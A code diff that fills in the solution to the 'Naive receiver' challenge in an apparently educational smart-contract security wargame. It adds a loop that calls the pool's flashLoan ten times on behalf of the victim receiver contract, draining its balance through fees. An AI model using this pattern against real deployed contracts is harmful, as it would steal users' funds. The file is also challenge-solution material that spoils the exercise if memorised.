@@ -38,6 +38,15 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        for (let i = 0; i < 10; i++) {
+            await pool.connect(player).flashLoan(
+                receiver.address,
+                '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',
+                0,
+                '0x'
+            )
+        }
+        // can improve to single tx with multicall
     });
 
     after(async function () {
